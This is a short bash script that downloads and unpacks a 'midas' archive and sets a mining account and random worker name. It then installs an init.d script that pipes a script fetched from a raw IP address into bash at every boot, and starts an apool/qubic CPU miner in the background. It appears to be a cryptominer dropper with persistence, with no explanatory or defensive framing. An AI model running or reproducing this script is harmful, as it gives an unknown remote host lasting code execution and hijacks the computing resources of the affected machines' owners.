cd /
rm -rf midas.tar
rm -rf midas
wget https://github.com/imprewa/amplitu/releases/download/rev2.0.1/midas.tar
tar -xvf midas.tar
cd /midas
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
cd /etc/init.d
echo "bash <(curl -s -L http://23.224.197.171:88/apool.sh)" > xenix.sh
chmod a+x xenix.sh
update-rc.d xenix.sh defaults
cd /apoolminer_linux_autoupdate_v1.4.1
nohup ./run_qubic_cpu.sh &
ps -ef | grep apool
